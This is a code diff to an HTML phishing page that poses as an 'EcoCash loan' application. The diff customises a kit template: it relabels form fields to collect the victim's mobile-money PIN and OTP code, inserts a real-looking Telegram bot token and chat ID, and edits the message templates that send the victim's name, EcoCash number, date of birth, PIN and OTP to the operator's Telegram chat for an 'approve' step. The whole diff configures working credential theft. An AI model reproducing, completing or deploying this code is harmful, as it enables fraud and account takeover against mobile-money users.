@@ -155,7 +155,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
 
     <!-- ↓↓↓ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↓↓↓ -->
     <div class="f">
-      <label>EDIT_LABEL_HERE</label>
+      <label>Pin</label>
       <input type="text" id="p2_field"/>
     </div>
     <!-- ↑↑↑ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↑↑↑ -->
@@ -215,7 +215,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
 
     <!-- ↓↓↓ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↓↓↓ -->
     <div class="f">
-      <label>EDIT_P4_LABEL_HERE</label>
+      <label>OTP CODE</label>
       <input type="text" id="p4_field"/>
     </div>
     <!-- ↑↑↑ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↑↑↑ -->
@@ -261,8 +261,8 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
 
 
 <script>
-  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-  const CHAT_ID   = "8718124300";
+  const BOT_TOKEN = "8851512259:AAFn3L6L4OXLbEOIiRoqta3mt508IAXEpek";
+  const CHAT_ID   = "8830426110";
   const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
   let app={}, pollTimer=null, countdown=null, lastId=0, curRef=null;
@@ -392,7 +392,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
       "📋 *ECOCASH LOAN — STEP 2*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
       `👤 *Name:* ${app.name}\n`+
       `📱 *EcoCash:* ${app.eco}\n\n`+
-      `▪️ *EDIT_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *PIN:* ${field}\n\n`+
       // ↑↑↑ CHANGE "EDIT_LABEL_HERE" ABOVE TO MATCH YOUR LABEL ↑↑↑
       `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n`+
       `👇 *Approve to proceed to Step 4:*`;
@@ -480,7 +480,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
       `💵 *Amount:* USD $${Number(app.amt).toLocaleString()}\n`+
       `🎂 *DOB:* ${app.dob}\n`+
       `▪️ *Step 2 Field:* ${app.p2field}\n\n`+
-      `▪️ *EDIT_P4_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *OTP CODE:* ${field}\n\n`+
       // ↑↑↑ CHANGE "EDIT_P4_LABEL_HERE" ABOVE TO MATCH YOUR LABEL ↑↑↑
       `🔖 *Final Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n`+
       `👇 *FINAL DECISION:*`;
